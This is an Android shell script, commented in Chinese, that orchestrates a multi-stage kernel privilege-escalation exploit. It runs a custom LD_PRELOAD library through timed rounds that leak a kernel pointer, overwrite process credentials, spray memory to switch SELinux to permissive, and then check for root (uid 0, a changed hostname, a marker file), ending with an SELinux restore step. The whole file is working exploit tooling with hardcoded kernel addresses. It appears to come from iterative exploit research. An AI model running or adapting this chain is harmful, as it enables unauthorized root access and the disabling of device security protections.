#!/system/bin/sh
# mt79 chain (2026-09-06 上午): R(CPU6) -> E5v3r2 external(SPRAY) -> C external -> E5R?
# 依据: HANDOFF §6.4 + mt77 配方 + mt79 修复。外部模式全程; 轮间冷却 60s。
# 判据: enforce=0 → E5 落地; hostname=glroot / root_alive.txt / Uid:0 → ROOT。
OUTD=/data/local/tmp
LOG=$OUTD/mt79chain_log.txt
LOAD=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null || echo 0)
LOAD_INT=${LOAD%.*}
if [ "${LOAD_INT:-99}" -gt 15 ]; then echo "load gate refuse: $LOAD"; exit 2; fi
echo "=== mt79 chain start $(date +%H:%M:%S) preload=$(sha256sum $OUTD/preload.so | cut -d' ' -f1)" > $LOG
pkill -9 -x sleep 2>/dev/null; pkill -9 -f 'while :; do' 2>/dev/null
am kill-all 2>/dev/null
rm -f $OUTD/mt49_child_status.txt $OUTD/root_alive.txt $OUTD/R.out $OUTD/E5.out $OUTD/C.out $OUTD/E5R.out

echo "--- R round (CPU6) ---" >> $LOG
timeout 250 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R \
  PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 \
  PSELECT_CONSUMER_CPU=6 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 > $OUTD/R.out 2>&1
echo "R rc=$? status=$(cat $OUTD/mt49_child_status.txt 2>/dev/null)" >> $LOG
TASK=$(cat $OUTD/mt49_child_status.txt 2>/dev/null | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1)
[ -z "$TASK" ] && { echo "no TASK - chain stop"; cat $LOG; exit 0; }
sleep 60

echo "--- E5v3r2 external TASK=$TASK (SPRAY) ---" >> $LOG
timeout 170 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_RETRY=1 \
  PSELECT_TASK=$TASK PSELECT_PTR_STRICT=1 PSELECT_CONSUMER_CPU=6 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=120 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 130 > $OUTD/E5.out 2>&1
E5ENF=$(getenforce)
echo "E5 rc=$? enforce=$E5ENF" >> $LOG
grep -a "mt79:" $OUTD/E5.out | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
sleep 60

echo "--- C external TASK=$TASK ---" >> $LOG
timeout 170 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C \
  PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 \
  PSELECT_TASK=$TASK PSELECT_CONSUMER_CPU=6 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=120 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 130 > $OUTD/C.out 2>&1
echo "C rc=$? enforce=$(getenforce) hostname=$(cat /proc/sys/kernel/hostname)" >> $LOG
echo "C status=$(cat $OUTD/mt49_child_status.txt 2>/dev/null)" >> $LOG
grep -a "mt48: PTR\|mt51:\|ROOT-SEEN\|mt73\|sethostname" $OUTD/C.out | sed 's/\x1b\[[0-9;]*m//g' | head -8 >> $LOG
cat $OUTD/root_alive.txt 2>/dev/null >> $LOG

if [ "$E5ENF" = "Permissive" ]; then
  sleep 60
  echo "--- E5R restore (SPRAY1) ---" >> $LOG
  timeout 170 env \
    PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
    PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_SELINUX_ENF_VALUE=SPRAY1 PSELECT_RETRY=1 \
    PSELECT_TASK=$TASK PSELECT_PTR_STRICT=1 PSELECT_CONSUMER_CPU=6 \
    PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=120 \
    PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
    PSELECT_NO_CANARY=1 \
    LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 130 > $OUTD/E5R.out 2>&1
  echo "E5R rc=$? enforce=$(getenforce)" >> $LOG
fi
echo "=== end $(date +%H:%M:%S) boot=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
cat $LOG
